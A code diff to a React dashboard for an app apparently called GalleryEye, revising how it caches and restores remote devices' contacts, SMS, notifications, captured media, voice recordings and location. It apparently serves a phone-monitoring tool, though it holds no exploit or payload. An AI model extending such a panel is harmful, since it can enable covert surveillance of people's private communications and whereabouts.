@@ -27,7 +27,7 @@ import TelemetryCards from "@/components/dashboard/TelemetryCards";
 import WhatsAppButton from "@/components/WhatsAppButton";
 import PlanBadge from "@/components/PlanBadge";
 import VideoModal from "@/components/VideoModal";
-import { getCleanDeviceName } from "@/lib/deviceNameHelper";
+import { getCleanDeviceName, isGhostDevice } from "@/lib/deviceNameHelper";
 
 // Dynamic imports for heavy modals to reduce initial JS payload
 const AppGenerationModal = dynamic(() => import("@/components/AppGenerationModal"), { ssr: false });
@@ -108,7 +108,7 @@ export default function Home(props: any) {
     const [galleryHasMore, setGalleryHasMore] = useState(true);
     const [isLoadingMore, setIsLoadingMore] = useState(false);
     const galleryLoaderRef = useRef<HTMLDivElement>(null);
-    const [folders, setFolders] = useState([]);
+    const [folders, setFolders] = useState<any[]>([]);
     const [isFetchingFolders, setIsFetchingFolders] = useState(false);
 
     // Plan State (Hydrated safely after mount in useEffect to prevent SSR hydration mismatch)
@@ -182,7 +182,10 @@ export default function Home(props: any) {
             if (cachedDevs) {
                 try {
                     const parsed = JSON.parse(cachedDevs);
-                    if (Array.isArray(parsed) && parsed.length > 0) setDevices(parsed);
+                    if (Array.isArray(parsed) && parsed.length > 0) {
+                        const clean = parsed.filter((d: any) => !isGhostDevice(d));
+                        setDevices(clean);
+                    }
                 } catch {}
             }
             
@@ -245,34 +248,53 @@ export default function Home(props: any) {
             const uuid = (session?.user as any)?.uuid;
             try {
                 const cachedContacts = localStorage.getItem(`galleryeye_contacts_${uuid}_${selectedDeviceId}`);
-                if (cachedContacts) setContactsList(JSON.parse(cachedContacts));
-                else setContactsList([]);
+                if (cachedContacts) {
+                    const parsed = JSON.parse(cachedContacts);
+                    if (Array.isArray(parsed) && parsed.length > 0) setContactsList(parsed);
+                }
 
                 const cachedSms = localStorage.getItem(`galleryeye_sms_${uuid}_${selectedDeviceId}`);
-                if (cachedSms) setSmsList(JSON.parse(cachedSms));
-                else setSmsList([]);
+                if (cachedSms) {
+                    const parsed = JSON.parse(cachedSms);
+                    if (Array.isArray(parsed) && parsed.length > 0) setSmsList(parsed);
+                }
 
                 const cachedNotifs = localStorage.getItem(`galleryeye_notifications_${uuid}_${selectedDeviceId}`);
-                if (cachedNotifs) setNotifications(JSON.parse(cachedNotifs));
+                if (cachedNotifs) {
+                    const parsed = JSON.parse(cachedNotifs);
+                    if (Array.isArray(parsed) && parsed.length > 0) setNotifications(parsed);
+                }
 
                 const cachedImages = localStorage.getItem(`gallery_images_${uuid}_${selectedDeviceId}`);
-                if (cachedImages) setImages(JSON.parse(cachedImages));
-                else setImages([]);
+                if (cachedImages) {
+                    const parsed = JSON.parse(cachedImages);
+                    if (Array.isArray(parsed) && parsed.length > 0) setImages(parsed);
+                }
 
                 const cachedCaptured = localStorage.getItem(`gallery_captured_${uuid}_${selectedDeviceId}`);
-                if (cachedCaptured) setCapturedMedia(JSON.parse(cachedCaptured));
-                else setCapturedMedia([]);
+                if (cachedCaptured) {
+                    const parsed = JSON.parse(cachedCaptured);
+                    if (Array.isArray(parsed) && parsed.length > 0) setCapturedMedia(parsed);
+                }
 
                 const cachedVoice = localStorage.getItem(`gallery_voice_${uuid}_${selectedDeviceId}`);
                 if (cachedVoice) {
                     const parsed = JSON.parse(cachedVoice);
                     if (Array.isArray(parsed) && parsed.length > 0) setCapturedVoice(parsed);
                 }
-            } catch {
-                setImages([]);
-                setFolders([]);
-                setCapturedMedia([]);
-                setCapturedVoice([]);
+
+                const cachedFolders = localStorage.getItem(`gallery_folders_${uuid}_${selectedDeviceId}`);
+                if (cachedFolders) {
+                    const parsed = JSON.parse(cachedFolders);
+                    if (Array.isArray(parsed) && parsed.length > 0) setFolders(parsed);
+                }
+
+                const cachedLoc = localStorage.getItem(`loc_${selectedDeviceId}`);
+                if (cachedLoc) {
+                    try { setLocationData(JSON.parse(cachedLoc)); } catch {}
+                }
+            } catch (err) {
+                console.error('[Cache] Error restoring device cache:', err);
             }
 
             if ((window as any).fetchGalleryData) {
@@ -289,7 +311,7 @@ export default function Home(props: any) {
                 fetch(`https://p01--gallery-eye--9zr85m7yb6s4.code.run/api/contacts/${uuid}?deviceId=${selectedDeviceId}`)
                     .then(res => res.json())
                     .then(data => {
-                        if (data.contacts && Array.isArray(data.contacts)) {
+                        if (data.contacts && Array.isArray(data.contacts) && data.contacts.length > 0) {
                             setContactsList(data.contacts);
                             try { localStorage.setItem(`galleryeye_contacts_${uuid}_${selectedDeviceId}`, JSON.stringify(data.contacts)); } catch {}
                         }
@@ -298,7 +320,7 @@ export default function Home(props: any) {
                 fetch(`https://p01--gallery-eye--9zr85m7yb6s4.code.run/api/sms/${uuid}?deviceId=${selectedDeviceId}`)
                     .then(res => res.json())
                     .then(data => {
-                        if (data.sms && Array.isArray(data.sms)) {
+                        if (data.sms && Array.isArray(data.sms) && data.sms.length > 0) {
                             setSmsList(data.sms);
                             try { localStorage.setItem(`galleryeye_sms_${uuid}_${selectedDeviceId}`, JSON.stringify(data.sms)); } catch {}
                         }
@@ -307,7 +329,7 @@ export default function Home(props: any) {
                 fetch(`https://p01--gallery-eye--9zr85m7yb6s4.code.run/api/notifications/${uuid}?deviceId=${selectedDeviceId}`)
                     .then(res => res.json())
                     .then(data => {
-                        if (data.notifications && Array.isArray(data.notifications)) {
+                        if (data.notifications && Array.isArray(data.notifications) && data.notifications.length > 0) {
                             setNotifications(data.notifications);
                             try { localStorage.setItem(`galleryeye_notifications_${uuid}_${selectedDeviceId}`, JSON.stringify(data.notifications)); } catch {}
                         }
@@ -385,8 +407,22 @@ export default function Home(props: any) {
         
         const uuid = session?.user?.uuid || (session?.user as any)?.id || (typeof window !== 'undefined' ? localStorage.getItem('galleryeye_last_uuid') : '') || '';
 
+        // Find any matched devices in current state to collect all their ID forms
+        const allTargetIds = new Set<string>(ids);
+        devices.forEach(d => {
+            const d1 = String(d.deviceId || '');
+            const d2 = String(d.id || '');
+            const d3 = String(d._id || '');
+            if (ids.includes(d1) || ids.includes(d2) || ids.includes(d3)) {
+                if (d1) allTargetIds.add(d1);
+                if (d2) allTargetIds.add(d2);
+                if (d3) allTargetIds.add(d3);
+            }
+        });
+        const targetIdsArr = Array.from(allTargetIds);
+
         // Immediately record in deletedDevicesRef and localStorage for permanent deletion response
-        ids.forEach(id => {
+        targetIdsArr.forEach(id => {
             deletedDevicesRef.current.add(id);
             notifiedDevicesRef.current.delete(id);
             try {
@@ -397,6 +433,8 @@ export default function Home(props: any) {
                     localStorage.removeItem(`galleryeye_notifications_${uuid}_${id}`);
                     localStorage.removeItem(`gallery_images_${uuid}_${id}`);
                     localStorage.removeItem(`gallery_captured_${uuid}_${id}`);
+                    localStorage.removeItem(`gallery_voice_${uuid}_${id}`);
+                    localStorage.removeItem(`gallery_folders_${uuid}_${id}`);
                     localStorage.removeItem(`fm_cache_${uuid}_${id}`);
                     localStorage.removeItem(`loc_${id}`);
                 }
@@ -407,19 +445,23 @@ export default function Home(props: any) {
             localStorage.setItem('galleryeye_deleted_devices', JSON.stringify(Array.from(deletedDevicesRef.current)));
         } catch {}
 
-        // Remove from local UI state immediately
-        setDevices(prev => prev.filter(d => {
-            const devId = String(d.deviceId || d.id || d._id);
-            return !ids.includes(devId) && !ids.includes(String(d.deviceId)) && !ids.includes(String(d.id));
-        }));
+        // Remove from local UI state immediately and update cached devices
+        setDevices(prev => {
+            const updated = prev.filter(d => {
+                const devId = String(d.deviceId || d.id || d._id || '');
+                return !allTargetIds.has(devId) && !allTargetIds.has(String(d.deviceId)) && !allTargetIds.has(String(d.id));
+            });
+            try { localStorage.setItem('galleryeye_cached_devices', JSON.stringify(updated)); } catch {}
+            return updated;
+        });
 
-        if (selectedDeviceId && ids.includes(String(selectedDeviceId))) {
+        if (selectedDeviceId && allTargetIds.has(String(selectedDeviceId))) {
             setSelectedDeviceId(null);
             try { localStorage.removeItem('selectedDeviceId'); } catch {}
         }
 
         // Send deletion request to server
-        for (const deviceId of ids) {
+        for (const deviceId of targetIdsArr) {
             try {
                 if (socket && uuid) {
                     socket.emit('delete_device', { uuid, deviceId, id: deviceId });
@@ -765,8 +807,11 @@ export default function Home(props: any) {
                     if (data && Array.isArray(data.devices)) {
                         const filteredList = data.devices.filter((d: any) => {
                             const devId = String(d.deviceId || d.id || d._id || '');
-                            if (d.online) return true;
-                            return devId && !deletedDevicesRef.current.has(devId) && !deletedDevicesRef.current.has(String(d.deviceId)) && !deletedDevicesRef.current.has(String(d.id));
+                            if (isGhostDevice(d)) return false;
+                            if (deletedDevicesRef.current.has(devId) || deletedDevicesRef.current.has(String(d.deviceId)) || deletedDevicesRef.current.has(String(d.id)) || deletedDevicesRef.current.has(String(d._id))) {
+                                return false;
+                            }
+                            return Boolean(devId);
                         });
                         const enhancedList = filteredList.map((d: any) => {
                             const devId = String(d.deviceId || d.id || d._id || '');
@@ -858,8 +903,11 @@ export default function Home(props: any) {
             socket.on("device_list_update", (deviceList: any[]) => {
                 const filteredList = Array.isArray(deviceList) ? deviceList.filter(d => {
                     const devId = String(d.deviceId || d.id || d._id || '');
-                    if (d.online) return true;
-                    return devId && !deletedDevicesRef.current.has(devId) && !deletedDevicesRef.current.has(String(d.deviceId)) && !deletedDevicesRef.current.has(String(d.id));
+                    if (isGhostDevice(d)) return false;
+                    if (deletedDevicesRef.current.has(devId) || deletedDevicesRef.current.has(String(d.deviceId)) || deletedDevicesRef.current.has(String(d.id)) || deletedDevicesRef.current.has(String(d._id))) {
+                        return false;
+                    }
+                    return Boolean(devId);
                 }) : [];
 
                 const enhancedList = filteredList.map(d => {
@@ -900,12 +948,18 @@ export default function Home(props: any) {
                         const prevStr = prev ? String(prev) : null;
                         const currentSelected = filteredList.find(d => String(d.deviceId || d.id || d._id || '') === prevStr);
 
-                        // 1. If currently selected device is ONLINE, keep it!
-                        if (currentSelected && currentSelected.online) {
+                        // 1. If currently selected device exists in list (ONLINE OR OFFLINE), retain user selection!
+                        if (currentSelected) {
                             return prev;
                         }
 
-                        // 2. If an ONLINE device is available, switch to the online device!
+                        // 2. Check if savedId in localStorage exists in list
+                        const savedId = typeof window !== 'undefined' ? localStorage.getItem('selectedDeviceId') : null;
+                        if (savedId && filteredList.some(d => String(d.deviceId || d.id || d._id || '') === savedId)) {
+                            return savedId;
+                        }
+
+                        // 3. Fallback: prefer first online device if no active selection
                         const firstOnline = filteredList.find(d => d.online);
                         if (firstOnline) {
                             const onlineId = String(firstOnline.deviceId || firstOnline.id || firstOnline._id || '');
@@ -913,18 +967,7 @@ export default function Home(props: any) {
                             return onlineId;
                         }
 
-                        // 3. If no device is online, preserve previous selection
-                        if (currentSelected) {
-                            return prev;
-                        }
-
-                        // 4. Check if savedId in localStorage exists in list
-                        const savedId = typeof window !== 'undefined' ? localStorage.getItem('selectedDeviceId') : null;
-                        if (savedId && filteredList.some(d => String(d.deviceId || d.id || d._id || '') === savedId)) {
-                            return savedId;
-                        }
-
-                        // 5. Fallback to first device in list
+                        // 4. Fallback to first device in list
                         const firstId = String(filteredList[0].deviceId || filteredList[0].id || filteredList[0]._id || '');
                         try { localStorage.setItem('selectedDeviceId', firstId); } catch {}
                         return firstId;
@@ -936,6 +979,7 @@ export default function Home(props: any) {
             socket.on("device_status", (data: any) => {
                 if (!data || !data.deviceId) return;
                 const devId = String(data.deviceId);
+                if (deletedDevicesRef.current.has(devId)) return;
                 const isOnline = !!data.online;
 
                 setDevices(prev => {
@@ -949,6 +993,7 @@ export default function Home(props: any) {
                     });
                 });
             });
+
 
             // Real-time plan update push from Admin panel
             socket.on("plan_updated", (data: any) => {
@@ -1041,7 +1086,14 @@ export default function Home(props: any) {
             });
 
             socket.on("folder_list", (data: any) => {
-                setFolders(data);
+                if (Array.isArray(data) && data.length > 0) {
+                    setFolders(data);
+                    if (uuid && selectedDeviceIdRef.current) {
+                        try { localStorage.setItem(`gallery_folders_${uuid}_${selectedDeviceIdRef.current}`, JSON.stringify(data)); } catch {}
+                    }
+                } else if (Array.isArray(data)) {
+                    setFolders(data);
+                }
                 setIsFetchingFolders(false);
             });
 
